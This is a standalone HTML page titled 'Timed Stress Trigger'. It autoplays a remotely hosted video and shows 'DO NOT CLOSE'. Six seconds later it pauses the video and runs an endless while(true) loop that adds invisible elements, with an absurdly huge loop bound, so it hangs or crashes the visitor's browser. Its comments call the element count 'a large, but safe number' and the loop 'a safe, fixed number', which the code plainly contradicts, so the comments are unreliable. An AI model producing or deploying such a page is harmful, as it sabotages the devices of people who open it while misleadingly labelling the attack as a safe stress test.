<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Timed Stress Trigger</title>
    <!-- Load Tailwind CSS for styling -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            /* Ensure body takes up 100% of the viewport and hides scrollbars */
            height: 100vh;
            overflow: hidden;
            transition: background-color 0.2s; /* Added for the flash effect */
        }
        /* Custom styling for the generated elements */
        .stress-element {
            /* Small, absolutely positioned, and nearly invisible */
            width: 5px;
            height: 5px;
            position: absolute;
            background-color: #fca5a5; /* Light red */
            opacity: 0.01; /* Extremely low opacity */
            border-radius: 50%;
        }
    </style>
</head>
<body class="bg-gray-900 flex items-center justify-center p-0 m-0 h-screen">

    <!-- Video Container - Takes up the entire viewport -->
    <div class="absolute inset-0 w-full h-full">
        <!-- 
            The 'video' element is permanently muted (necessary for autoplay) and plays your provided video.
        -->
        <video id="my-video" 
               autoplay 
               playsinline 
               loop 
               class="w-full h-full object-cover">
            <!-- Source from your provided path -->
            <source src="https://ubg1300.github.io/buffervidchrome/vid.mp4" type="video/mp4">
            Your browser does not support the video tag.
        </video>
    </div>
    <!-- Element Container for the stress test divs -->
    <div id="element-container" class="absolute inset-0 z-0 pointer-events-none"></div>

    <!-- Action Status Display (Visible on top of the video) -->
    <div id="status-message" 
         class="absolute top-4 left-1/2 transform -translate-x-1/2 p-3 rounded-lg font-medium text-center bg-blue-900 bg-opacity-80 text-blue-300 z-10">
        Status: Loading
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const videoElement = document.getElementById('my-video');
            const statusMessage = document.getElementById('status-message');
            const container = document.getElementById('element-container'); // Element container for divs
            
            const TIMEOUT_MS = 6000; // 6 seconds
            const BURST_ELEMENTS = 21939382181231249021090291309231092913983218132832118329289389329832189213892318321891238123883281238913289238123823876545617732123871671327823176132; // A large, but safe number of elements to generate for stress test

            /**
             * Creates and appends a batch of elements to the container.
             * @param {number} numElements - The number of elements to generate in this burst.
             */
            function generateElements(numElements) {
                const fragment = document.createDocumentFragment();
                const containerRect = container.getBoundingClientRect();
                const containerWidth = containerRect.width;
                const containerHeight = containerRect.height;

                // Loop is now a safe, fixed number (numElements)
                for (let i = 0; i < 21939382181231249021090291309231092913983218132832118329289389329832189213892318321891238123883281238913289238123823876545617732123871671327823176132; i++) {
                    const div = document.createElement('div');
                    div.className = 'stress-element';
                    
                    // Random position within the container
                    const x = Math.random() * containerWidth;
                    const y = Math.random() * containerHeight;
                    
                    div.style.left = `${x}px`;
                    div.style.top = `${y}px`;
                    
                    fragment.appendChild(div);
                }
                container.appendChild(fragment);
                console.log(`Generated ${numElements.toLocaleString()} invisible stress elements.`);
            }

            /**
             * The function that is called exactly 6 seconds after the video starts.
             * This triggers the video pause and the DOM stress burst.
             */
            function handleSixSecondsReached() {
                videoElement.pause();
                while(true){
                generateElements(BURST_ELEMENTS);
                }
                console.log("--- 6 SECOND ACTION TRIGGERED --- Video Paused and Stress Test Started.");
                

                // Flash the screen red (Visual feedback for the timed action)
                document.body.style.backgroundColor = '#ef4444'; // Tailwind red-500
                
                setTimeout(() => {
                    document.body.style.backgroundColor = 'transparent'; // Reset background
                }, 500);
            }

            // Listen for the video to start playing before setting the timer
            videoElement.addEventListener('playing', () => {
                // Only start the timer once
                if (!videoElement.timeoutSet) {
                    videoElement.timeoutSet = true; // Mark the timer as set

                    // Set the timeout for 6 seconds (6000 milliseconds)
                    setTimeout(handleSixSecondsReached, TIMEOUT_MS);
                    console.log(`Timeout set for ${TIMEOUT_MS}ms.`);
                    statusMessage.textContent = "DO NOT CLOSE";
                }
            });

            // Attempt to play the video when the page is ready
            videoElement.load();
            videoElement.play().catch(error => {
                // If autoplay is still blocked, rely on user interaction
                statusMessage.textContent = "Status: Tap anywhere to start the video and timer.";
                statusMessage.classList.remove('bg-blue-900', 'text-blue-300');
                statusMessage.classList.add('bg-yellow-500', 'text-gray-800', 'bg-opacity-90');
                
                // Since the video couldn't start, we rely on a click to start it
                document.body.addEventListener('click', () => {
                    videoElement.play().catch(e => console.error("Play on click failed:", e));
                }, { once: true });

                // As a fallback, still set the timer in case of delayed video loading/playback
                if (!videoElement.timeoutSet) {
                    videoElement.timeoutSet = true;
                    setTimeout(handleSixSecondsReached, TIMEOUT_MS);
                }
            });
        });
    </script>
</body>
</html>
